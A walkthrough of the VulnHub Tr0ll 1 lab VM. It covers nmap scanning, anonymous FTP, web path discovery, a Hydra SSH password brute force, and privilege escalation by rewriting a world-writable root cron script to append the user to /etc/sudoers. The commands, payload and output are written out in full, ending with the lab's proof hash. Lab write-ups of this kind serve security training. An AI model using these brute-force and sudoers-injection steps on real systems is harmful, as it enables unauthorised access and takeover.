# Tr0ll 1
[Link to vulnhub](https://www.vulnhub.com/entry/tr0ll-1,100/)

## Reconnaissance
I start with reconnaissance to find the target because it has been set to receive DHCP
```
nmap -sS -O 192.168.159.0/24
```
I found the target at **192.168.159.128**. Now I start enumerate services running on that host.

## Enumeration
```
root@BOEING:~# nmap -A -T4 -p- 192.168.159.128

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-02-28 22:41 PST
Nmap scan report for 192.168.159.128
Host is up (0.00072s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:6D:DF:F2 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.72 ms 192.168.159.128

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds
```
From an enumeration I got something interesting:
* Anonymous FTP login allowed
* HTTP service has 2 interesting pages:
  * robots.txt
  * secret

Let check for the services
### Anonymous FTP allowed
There is a file, lol.pcap
I found some text file name **secret_stuff.txt** was pushed to the FTP server. The file contains text:
```
Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

Sucks, you were so close... gotta TRY HARDER!
```

### HTTP service
When I browsed to the web I found nothing but just images
```
robots.txt >> from nmap result
hacker.jpg
/secret/troll.jpg
```

I found nothing useful in the web server with that paths. 
I back to the message in the text file I've got from PCAP file. I noticed that *sup3rs3cr3tdirlol* is in leet speak for *supersecretdirlol* then I checked that if it could be URL path of the HTTP service. 
And I found that **/sup3rs3cr3tdirlol/** exists and contains a file.
```
roflmao 2014-08-11 18:45  7.1K
```

I check for file type and found it is a binary file. I tried to execute it.
```
root@BOEING:/kapi/vulnhub/tr0ll# file roflmao 
roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped
root@BOEING:/kapi/vulnhub/tr0ll# ./roflmao 
Find address 0x0856BF to proceed
```
I was not gonna reverse the binary because when the binary was running there was no memory address **0x0856BF**. So I tried to use 0x0856BF as URL path in HTTP service again.

I found 2 directories
```
[DIR] good_luck/  2014-08-12 23:59  -    
[DIR] this_folder_contains_the_password/  2014-08-12 23:58  -    
```

### 0x0856BF/good_luck/
There is a file named which_one_lol.txt contains text:
```
maleus
ps-aux
felux
Eagle11
genphlux < -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
```

### 0x0856BF/this_folder_contains_the_password/
There is a file named Pass.txt contains text:
```
Good_job_:)
```

## Exploitation
These 2 files could be possible users or passwords. I start with use the first file as user list and the second file as password.
```
root@BOEING:/kapi/vulnhub/tr0ll# hydra -s 22 -v -V -L users -P pass -e n -t 1 -w 30 192.168.159.128 ssh
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-03-01 00:33:13
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 1 task per 1 server, overall 64 tasks, 20 login tries (l:10/p:2), ~0 tries per task
[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses ... done
[INFO] Testing if password authentication is supported by ssh://192.168.159.128:22
[INFO] Successful, password authentication is supported by ssh://192.168.159.128:22
[ATTEMPT] target 192.168.159.128 - login "maleus" - pass "" - 1 of 20 [child 0]
[ATTEMPT] target 192.168.159.128 - login "maleus" - pass "Good_job_:)" - 2 of 20 [child 0]
[ATTEMPT] target 192.168.159.128 - login "ps-aux" - pass "" - 3 of 20 [child 0]
[ATTEMPT] target 192.168.159.128 - login "ps-aux" - pass "Good_job_:)" - 4 of 20 [child 0]
[ATTEMPT] target 192.168.159.128 - login "felux" - pass "" - 5 of 20 [child 0]
[ATTEMPT] target 192.168.159.128 - login "felux" - pass "Good_job_:)" - 6 of 20 [child 0]
[ATTEMPT] target 192.168.159.128 - login "Eagle11" - pass "" - 7 of 20 [child 0]
[ATTEMPT] target 192.168.159.128 - login "Eagle11" - pass "Good_job_:)" - 8 of 20 [child 0]
[ATTEMPT] target 192.168.159.128 - login "genphlux" - pass "" - 9 of 20 [child 0]
[ATTEMPT] target 192.168.159.128 - login "genphlux" - pass "Good_job_:)" - 10 of 20 [child 0]
[ATTEMPT] target 192.168.159.128 - login "usmc8892" - pass "" - 11 of 20 [child 0]
[ATTEMPT] target 192.168.159.128 - login "usmc8892" - pass "Good_job_:)" - 12 of 20 [child 0]
[ATTEMPT] target 192.168.159.128 - login "blawrg" - pass "" - 13 of 20 [child 0]
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.159.128 - login "blawrg" - pass "" - 13 of 20 [child 0]
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
```

The problem started from user blawrg, if hydra fail to logon then the host will block my Kali's IP. I have to change my Kali's IP and then could start trying a new user. I finished but no users could log in. 

I noticed that the directory contained Pass.txt is **this_folder_contains_the_password**. This could mean something so I retry again an use **Pass.txt** as password and I got **overflow** could log in with the password WTH!.
```
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Mar  1 07:43:07 2017 from 192.168.159.1
Could not chdir to home directory /home/overflow: No such file or directory
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
$ bash
overflow@troll:/$ 
```

## Escalation
After I logged in I tried to find that flag but I could not find it. Since overflow was a low privilege so I had to escalate the privilege and find the flag as root then I'll access more directories.

* I had checked for crontabs and no file is world writable.
* tmp directory is empty

I started check for world writable file in var/. There is no file interesting but one.
```
overflow@troll:/$ l_path=var/*/*;while [ "$l_path" != / -a "$l_path" != . ]; do ls -ld $l_path; l_path=$(dirname -- "$l_path");done;
...
...
-rwxrwxrwx  1 root       root            23 Aug 13  2014 var/log/cronlog
...
...
```

Let check for **var/log/cronlog**
```
overflow@troll:/$ cat var/log/cronlog
*/2 * * * * cleaner.py
```
This is cron job which run every 2 minutes. If I could modify cleaner.py and let python do something for me so I would be able to escalate overflow's privilege. But in the first place, I have to file cleaner.py.

Find cleaner.py
```
overflow@troll:/$ find / -name cleaner.py | grep "cleaner.py"
...
...
...
/lib/log/cleaner.py
```

Let check for the python file
```
overflow@troll:/$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
overflow@troll:/$ ls -al /lib/log/cleaner.py
```
Now good news, I found the python file and it's worldwritable.

Modify cleaner.py
```
overflow@troll:/$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('echo "overflow ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()
```
Now wait for 2 minutes....

```
overflow@troll:/$ sudo su
sudo: unable to resolve host troll
root@troll:/# 
```
Now I got root!!!

## Finding the flag
I just check for /root directory and found the proof file.
```
root@troll:~# ls -al
total 28
drwx------  3 root root 4096 Aug 13  2014 .
drwxr-xr-x 21 root root 4096 Aug  9  2014 ..
-rw-------  1 root root    0 Aug 13  2014 .bash_history
-rw-r--r--  1 root root   58 Aug 10  2014 proof.txt
-rw-r--r--  1 root root   74 Aug 10  2014 .selected_editor
drwx------  2 root root 4096 Aug 10  2014 .ssh
-rw-------  1 root root 5538 Aug 13  2014 .viminfo
root@troll:~# cat proof.txt 
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
```


### For other information
* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
